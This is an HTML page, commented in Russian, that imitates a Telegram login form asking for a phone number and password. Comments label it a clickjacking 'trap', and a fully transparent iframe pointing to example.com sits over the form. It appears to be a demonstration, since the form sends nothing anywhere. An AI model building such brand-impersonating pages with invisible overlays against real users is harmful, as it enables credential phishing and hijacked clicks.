<!DOCTYPE html>
<html lang="ru">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Вход в Telegram</title>
    <style>
        body {
            font-family: Arial, sans-serif;
            text-align: center;
            background-color: #f5f5f5;
            margin: 0;
            padding: 0;
            display: flex;
            flex-direction: column;
            align-items: center;
            justify-content: center;
            height: 100vh;
        }

        .container {
            background-color: white;
            padding: 20px;
            border-radius: 10px;
            box-shadow: 0 0 10px rgba(0, 0, 0, 0.1);
            width: 320px;
            position: relative;
        }

        .logo {
            width: 50px;
        }

        h2 {
            margin-top: 10px;
            color: #0088cc;
        }

        .input-group {
            display: flex;
            flex-direction: column;
            margin-top: 15px;
        }

        input {
            padding: 10px;
            margin-bottom: 10px;
            border: 1px solid #ccc;
            border-radius: 5px;
            font-size: 16px;
        }

        button {
            background-color: #0088cc;
            color: white;
            border: none;
            padding: 10px;
            border-radius: 5px;
            cursor: pointer;
            font-size: 16px;
        }

        button:hover {
            background-color: #0077b3;
        }

        /* Имитируем Clickjacking */
        .hidden-iframe {
            position: absolute;
            top: 0;
            left: 0;
            width: 100%;
            height: 100%;
            opacity: 0;
            z-index: 2;
        }

        /* Ловушка: размещаем невидимый iframe поверх формы */
        .trap {
            position: relative;
            display: inline-block;
        }

    </style>
</head>
<body>

    <div class="container trap">
        <img src="https://upload.wikimedia.org/wikipedia/commons/8/82/Telegram_logo.svg" alt="Telegram Logo" class="logo">
        <h2>Вход в Telegram</h2>
        <div class="input-group">
            <input type="text" placeholder="Номер телефона">
            <input type="password" placeholder="Пароль">
            <button>Войти</button>
        </div>

        <!-- Ловушка: iframe -->
        <iframe class="hidden-iframe" src="https://example.com"></iframe>
    </div>

</body>
</html>
